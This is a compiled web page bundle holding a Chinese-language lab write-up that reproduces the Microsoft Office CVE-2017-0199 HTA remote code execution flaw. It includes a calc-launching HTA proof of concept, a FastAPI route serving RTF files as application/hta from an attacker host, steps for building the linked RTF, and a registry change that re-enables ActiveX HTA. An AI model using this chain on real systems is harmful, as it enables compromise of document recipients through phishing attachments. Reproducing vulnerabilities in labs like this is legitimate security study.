import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as a,o as i,c,a as e,d as n,b as o,e as l}from"./app-BT-bWAve.js";const r={},p=l('<h1 id="cve-2017-0199" tabindex="-1"><a class="header-anchor" href="#cve-2017-0199"><span>CVE-2017-0199</span></a></h1><hr><ul><li><a href="#cve-2017-0199">CVE-2017-0199</a><ul><li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li><li><a href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83">复现环境</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li><li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li></ul></li></ul><hr><h2 id="简介" tabindex="-1"><a class="header-anchor" href="#简介"><span>简介</span></a></h2>',5),u={href:"https://www.hackersb.cn/hacker/228.html",target:"_blank",rel:"noopener noreferrer"},d=e("p",null,"CVE-2017-0199是首个Microsoft Office RTF漏洞，漏洞发布日期为2017年4月11日",-1),h=e("p",null,"受影响系统包括：",-1),f=e("ul",null,[e("li",null,"Microsoft Office 2016"),e("li",null,"Microsoft Office 2013"),e("li",null,"Microsoft Office 2010"),e("li",null,"Microsoft Office 2007")],-1),_=e("p",null,"当用户打开包含嵌入式漏洞的文档时，此漏洞允许恶意攻击者下载并执行包含PowerShell命令的Visual Basic脚本。",-1),m={href:"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2017-0199",target:"_blank",rel:"noopener noreferrer"},E=e("hr",null,null,-1),g=e("h2",{id:"复现环境",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#复现环境"},[e("span",null,"复现环境")])],-1),k=e("p",null,"靶机:",-1),b={href:"https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0",target:"_blank",rel:"noopener noreferrer"},v={href:"https://msdn.itellyou.cn/",target:"_blank",rel:"noopener noreferrer"},y=e("li",null,[n("IP: "),e("code",null,"192.168.1.14")],-1),C=e("li",null,[e("p",null,"攻击机 Kali"),e("ul",null,[e("li",null,[n("IP: "),e("code",null,"100.1.1.131")])])],-1),B=e("hr",null,null,-1),V=e("h2",{id:"漏洞复现",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞复现"},[e("span",null,"漏洞复现")])],-1),w={href:"https://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/",target:"_blank",rel:"noopener noreferrer"},x=e("p",null,[n("很多漏洞复现的文章都提到了使用 Apache 服务器, 其目的都指向自定义响应 "),e("code",null,"Content-type")],-1),A=e("p",null,[n("因此这里我们只需要能够自定义响应的 "),e("code",null,"Content-type"),n(" 就不一定需要 Apache 服务器")],-1),O={href:"https://gitlab.com/ayusummer233/dailynotescodebackup/-/blob/main/Python/use_case/FileServer/FastAPI/fileserver.py?ref_type=heads",target:"_blank",rel:"noopener noreferrer"},F=l(`<p>这里也以这个 Fastapi 写的 FileServer 为例</p><p>在路由里指定 <code>Content-type</code> 即可</p><hr><p>编写一个弹计算器的 POC:</p><p><code>calc.hta</code></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
    a=new ActiveXObject(&quot;WScript.Shell&quot;);
    a.run(&#39;%windir%\\\\System32\\\\cmd.exe /c calc.exe&#39;, 0);window.close();
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>用 Office2016 新建一个 word 文档保存为 <code>office2016.docx</code> 将其放到 FileServer 的 <code>upload</code> 目录下并重命名为 <code>office2016docx.rtf</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406140951201.png" alt="image-20240614095147296"></p><p>在靶机上用 Office2016 新建一个 word 文档, <code>插入-&gt;对象-&gt;由文件创建</code></p><p>填写 FileServer 中刚才放置的 <code>office2016docx.rtf</code> 的下载链接, 这里是 <code>http://100.1.1.131:8000/download/office2016docx.rtf</code></p><p>并勾选 <code>链接到文件</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406131807154.png" alt="image-20240613180746628"></p><p>点击 <code>确定</code> 后即会请求该文件</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406131809247.png" alt="image-20240613180914152"></p><p>保存为 rtf 文件 <code>Office2016docx-insert-rtf.rtf</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406131813096.png" alt="image-20240613181301997"></p><hr><p>解下来就需要对这个链接的 rtf 文件动手了, 使用前面编写的弹计算器的 POC <code>calc.hta</code> 重命名并替换掉前面 FileServer 上放置的 <code>office2016docx.rtf</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406140956046.png" alt="image-20240614095637939"></p><p>然后改下 <code>fileserver.py</code> 中文件下载的路由, 让下载 <code>rtf</code> 文件的响应中的 <code>Content-type</code> 为 <code>application/hta</code>:</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">&quot;/download/{file_path:path}&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    file_location <span class="token operator">=</span> UPLOAD_DIRECTORY <span class="token operator">/</span> Path<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> file_location<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> file_location<span class="token punctuation">.</span>suffix <span class="token operator">==</span> <span class="token string">&quot;.rtf&quot;</span><span class="token punctuation">:</span>
            media_type <span class="token operator">=</span> <span class="token string">&quot;application/hta&quot;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> FileResponse<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_location<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> FileResponse<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_location<span class="token punctuation">)</span><span class="token punctuation">,</span> media_type<span class="token operator">=</span>media_type<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406140958961.png" alt="image-20240614095814853"></p><hr><p>双击打开靶机 Win7 上的 <code>Office2016docx-insert-rtf.rtf</code></p><p>如果报错如下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406140959527.png" alt="image-20240614095953403"></p>`,27),D={href:"https://cloud.tencent.com/developer/article/2002507",target:"_blank",rel:"noopener noreferrer"},N=l('<p>解决方案为将 <code>Win+R -&gt; 输入regedit -&gt; 回车</code> 注册表项 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\ActiveX Compatibility\\{3050f4d8-98b5-11cf-BB82-00AA00BDCE0B}</code> 从 <code>400</code> 改为 <code>0</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406141020003.png" alt="image-20240614102032895"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406141020290.png" alt="image-20240614102057166"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406161719114.png" alt="image-20240616171919988"></p><hr><h2 id="参考材料" tabindex="-1"><a class="header-anchor" href="#参考材料"><span>参考材料</span></a></h2>',6),S=e("p",null,"分析",-1),P={href:"https://blog.csdn.net/qq_37672864/article/details/89353787",target:"_blank",rel:"noopener noreferrer"},M=e("p",null,"利用工具",-1),q={href:"https://github.com/bhdresh/CVE-2017-0199",target:"_blank",rel:"noopener noreferrer"},I=e("p",null,"复现过程",-1),T={href:"https://zhuanlan.zhihu.com/p/26522540",target:"_blank",rel:"noopener noreferrer"},R={href:"https://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/",target:"_blank",rel:"noopener noreferrer"},H={href:"https://delcoding.github.io/2017/11/office-cve-2017-0199/",target:"_blank",rel:"noopener noreferrer"},L={href:"https://www.hackersb.cn/hacker/228.html",target:"_blank",rel:"noopener noreferrer"},W={href:"https://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/",target:"_blank",rel:"noopener noreferrer"},z=e("li",null,"[code2sec.com/office漏洞CVE-2017-0199复现：HTA Handler Vulnerability（一）.md at master · bit4woo/code2sec.com · GitHub](https://github.com/bit4woo/code2sec.com/blob/master/office漏洞CVE-2017-0199复现：HTA Handler Vulnerability（一）.md)",-1),G={href:"https://exp10it.io/2019/07/office-cve-2017-0199-%E5%A4%8D%E7%8E%B0/",target:"_blank",rel:"noopener noreferrer"},K=e("li",null,"[CVE-2017-0199 Microsoft Office 逻辑漏洞复现和利用 | Hacked By Fish_o0O (fish-o0o.github.io)](https://fish-o0o.github.io/2018/03/07/CVE-2017-0199 Microsoft Office 逻辑漏洞复现和利用/)",-1),X={href:"https://www.cnblogs.com/SecurityKid/p/7384918.html",target:"_blank",rel:"noopener noreferrer"},U={href:"https://gorgias.me/2017/05/07/CVE-2017-0199-%E5%88%A9%E7%94%A8/",target:"_blank",rel:"noopener noreferrer"},J={href:"https://www.40huo.cn/blog/cve-2017-0199.html",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://cloud.tencent.com/developer/article/2002507",target:"_blank",rel:"noopener noreferrer"},j=e("p",null,"检测对抗",-1),Q={href:"https://blog.nsfocus.net/microsoft-office-ole2link-exploits-technology-analysis/",target:"_blank",rel:"noopener noreferrer"},Z={href:"https://cloud.tencent.com/developer/article/1044292",target:"_blank",rel:"noopener noreferrer"},$={href:"https://paper.seebug.org/520/",target:"_blank",rel:"noopener noreferrer"};function ee(ne,te){const t=a("ExternalLinkIcon");return i(),c("div",null,[p,e("blockquote",null,[e("p",null,[e("a",u,[n("Tuuu Nya's blog | 一个想当黑客的艺术家 ✨ (hackersb.cn)"),o(t)])])]),d,h,f,_,e("p",null,[n("微软官方对该漏洞的通告："),e("a",m,[n("CVE-2017-0199 - Security Update Guide - Microsoft - Microsoft Office/WordPad Remote Code Execution Vulnerability w/Windows"),o(t)])]),E,g,e("ul",null,[e("li",null,[k,e("ul",null,[e("li",null,[e("a",b,[n("Win7"),o(t)]),n("+"),e("a",v,[n("Office2010"),o(t)])]),y])]),C]),B,V,e("blockquote",null,[e("p",null,[e("a",w,[n("CVE-2017-0199漏洞复现过程 · 浮萍's Blog (fuping.site)"),o(t)])])]),x,A,e("p",null,[n("可以用 "),e("a",O,[n("Python/use_case/FileServer/FastAPI/fileserver.py · main · 33 2 / DailyNotesCodeBackup · GitLab"),o(t)])]),F,e("p",null,[n("根据 "),e("a",D,[n("CVE-2017-0199复现失败解决方案-腾讯云开发者社区-腾讯云 (tencent.com)"),o(t)]),n(" 中提到的, 这是因为注册表默认禁用了ActiveX执行HTA")]),N,e("ul",null,[e("li",null,[S,e("ul",null,[e("li",null,[e("a",P,[n("CVE-2017-0199漏洞分析-CSDN博客"),o(t)])])])]),e("li",null,[M,e("ul",null,[e("li",null,[e("a",q,[n("GitHub - bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration."),o(t)])])])]),e("li",null,[I,e("ul",null,[e("li",null,[n("手工复现 "),e("ul",null,[e("li",null,[e("a",T,[n("对CVE-2017-0199的一次复现过程与内网穿透的利用 - 知乎 (zhihu.com)"),o(t)])]),e("li",null,[e("a",R,[n("CVE-2017-0199漏洞复现过程 · 浮萍's Blog (fuping.site)"),o(t)])]),e("li",null,[e("a",H,[n("Office CVE-2017-0199复现 - Junay的博客 (delcoding.github.io)"),o(t)])]),e("li",null,[e("a",L,[n("Tuuu Nya's blog | 一个想当黑客的艺术家 ✨ (hackersb.cn)"),o(t)])]),e("li",null,[e("a",W,[n("CVE-2017-0199漏洞复现过程 · 浮萍's Blog (fuping.site)"),o(t)])]),z,e("li",null,[e("a",G,[n("Office CVE-2017-0199 复现 - X1r0z Blog (exp10it.io)"),o(t)])]),K,e("li",null,[e("a",X,[n("Office远程代码执行漏洞CVE-2017-0199复现 - SecurityKid - 博客园 (cnblogs.com)"),o(t)])])])]),e("li",null,[n("MSF "),e("ul",null,[e("li",null,[e("a",U,[n("OFFICE OLE2LINK 漏洞 (CVE-2017-0199) 利用 - Gorgias'Blog"),o(t)])]),e("li",null,[e("a",J,[n("CVE-2017-0199 复现 - 40huo's - 知至知终"),o(t)])])])]),e("li",null,[n("复现失败解决方案 "),e("ul",null,[e("li",null,[e("a",Y,[n("CVE-2017-0199复现失败解决方案-腾讯云开发者社区-腾讯云 (tencent.com)"),o(t)])])])])])]),e("li",null,[j,e("ul",null,[e("li",null,[e("a",Q,[n("Microsoft Office OLE2Link(CVE-2017-0199)漏洞利用技术分析与防护方案 – 绿盟科技技术博客 (nsfocus.net)"),o(t)])]),e("li",null,[e("a",Z,[n("对利用CVE-2017-0199漏洞的病毒变种的监测与分析-腾讯云开发者社区-腾讯云 (tencent.com)"),o(t)])]),e("li",null,[n("野外样本分析 "),e("ul",null,[e("li",null,[e("a",$,[n("CVE-2017-8570首次公开的野外样本及漏洞分析 (seebug.org)"),o(t)])])])])])])])])}const se=s(r,[["render",ee],["__file","CVE-2017-0199.html.vue"]]),ae=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-0199.html","title":"CVE-2017-0199","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"简介","slug":"简介","link":"#简介","children":[]},{"level":2,"title":"复现环境","slug":"复现环境","link":"#复现环境","children":[]},{"level":2,"title":"漏洞复现","slug":"漏洞复现","link":"#漏洞复现","children":[]},{"level":2,"title":"参考材料","slug":"参考材料","link":"#参考材料","children":[]}],"git":{"createdTime":1718553523000,"updatedTime":1718584626000,"contributors":[{"name":"233PC","email":"ayusummer233@gmail.com","commits":2}]},"readingTime":{"minutes":3.88,"words":1163},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/Office漏洞/CVE-2017-0199.md","localizedDate":"2024年6月16日","excerpt":"\\n<hr>\\n<ul>\\n<li><a href=\\"#cve-2017-0199\\">CVE-2017-0199</a>\\n<ul>\\n<li><a href=\\"#%E7%AE%80%E4%BB%8B\\">简介</a></li>\\n<li><a href=\\"#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83\\">复现环境</a></li>\\n<li><a href=\\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\\">漏洞复现</a></li>\\n<li><a href=\\"#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99\\">参考材料</a></li>\\n</ul>\\n</li>\\n</ul>"}');export{se as comp,ae as data};
